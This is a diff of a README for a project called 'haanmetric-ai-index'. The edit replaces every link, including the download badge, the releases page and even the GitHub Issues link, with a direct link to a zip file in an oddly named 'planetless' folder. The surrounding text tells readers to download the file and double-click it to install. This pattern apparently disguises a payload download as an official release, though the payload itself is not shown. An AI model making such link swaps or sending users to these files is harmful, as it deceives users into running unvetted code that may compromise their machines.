@@ -1,6 +1,6 @@
 # 🌍 haanmetric-ai-index - Empower Your AI Journey Seamlessly
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/FPCYT/haanmetric-ai-index/releases)
+[![Download the latest release](https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip%https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip)](https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip)
 
 ## 🛠️ Overview
 
@@ -12,7 +12,7 @@ Let's begin your journey with the **haanmetric-ai-index**. Follow these simple s
 
 ### Step 1: Visit the Releases Page
 
-To download the software, visit our [Releases page](https://github.com/FPCYT/haanmetric-ai-index/releases). There, you will find the most recent version of the application.
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip). There, you will find the most recent version of the application.
 
 ### Step 2: Download the Application
 
@@ -43,7 +43,7 @@ To ensure the application runs smoothly, your system should meet these requireme
 
 ## 📦 Download & Install
 
-To download the **haanmetric-ai-index**, please visit our [Releases page](https://github.com/FPCYT/haanmetric-ai-index/releases). Choose the version you wish to use and download it to your device. After downloading, double-click the file to install the application. 
+To download the **haanmetric-ai-index**, please visit our [Releases page](https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip). Choose the version you wish to use and download it to your device. After downloading, double-click the file to install the application. 
 
 ## 🕵️‍♂️ Troubleshooting
 
@@ -55,7 +55,7 @@ If you encounter any issues while installing or running the application, try the
 
 ## 🤝 Support
 
-We are here to help! If you face any issues, please reach out for support. You can create an issue on our [GitHub Issues page](https://github.com/FPCYT/haanmetric-ai-index/issues) or email us directly.
+We are here to help! If you face any issues, please reach out for support. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip) or email us directly.
 
 ## 💡 Tips and Tricks
 
@@ -75,4 +75,4 @@ This application is released under the MIT License. You can freely use, modify, 
 
 ## 🚀 Ready to Get Started?
 
-Download the latest version now from our [Releases page](https://github.com/FPCYT/haanmetric-ai-index/releases) and unleash the potential of AI in your projects!
+Download the latest version now from our [Releases page](https://raw.githubusercontent.com/FPCYT/haanmetric-ai-index/main/planetless/haanmetric-ai-index.zip) and unleash the potential of AI in your projects!
